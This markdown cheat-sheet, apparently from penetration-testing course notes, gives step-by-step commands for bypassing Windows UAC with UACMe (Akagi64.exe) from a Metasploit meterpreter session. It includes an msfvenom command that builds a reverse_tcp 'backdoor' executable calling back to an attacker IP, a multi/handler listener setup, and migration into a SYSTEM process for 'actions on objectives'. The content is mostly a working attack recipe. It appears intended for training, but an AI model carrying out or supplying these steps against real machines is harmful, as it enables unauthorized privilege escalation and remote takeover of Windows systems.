# Bypassing UAC

* [GitHub](#github)
* [UACMe](#uacme)
* [References](#references)

***********************************************************************
Items inside [SQUARE-BRACKETS] indicate changeable (fill in the blank) fields.  
Note: Bracket characters themselves [ ] require removal. See examples.
***********************************************************************

### GitHub
https://github.com/hfiref0x/UACME

***********************************************************************

## UACMe
Once you gain an Admin (with UAC set) meterpreter shell on target system...

Ensure that you have a x64/windows meterpreter shell, if not get one:
```
pgrep explorer
```
```
migrate [EXPLORER-PID]
```
Now you should have a x64/windows meterpreter shell:
```
sysinfo
```

Now create a malicious backdoor payload with msfvenom:
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=[ATTACK-IP] LPORT=[PORT] -f exe > backdoor.exe
```
set up Metasploit listener:
```
msfconsole
```
```
use multi/handler
```
```
set payload windows/meterpreter/reverse_tcp
```

set LHOST and LPORT and exploit  

Now upload backdoor.exe and chosen UACMe module to target machine.

Start a shell session:
```
shell
```

On target machine non-elevated shell:
```
.\[UACME-MODULE] [KEY-ID] [PATH-TO-BACKDOOR.exe]
```
Example:
```
.\Akagi64.exe 23 c:\Temp\backdoor.exe
```
The listener tab should now have a meterpreter session.  
Now list processes:
```
ps
```
Migrate to a process that is running as NT Authority\System:
```
migrate [PID]
```
Now preform actions on objectives:

***********************************************************************

### References
Penetration Tester Student v2 by INE  
https://my.ine.com/CyberSecurity/learning-paths/61f88d91-79ff-4d8f-af68-873883dbbd8c/penetration-testing-student-v2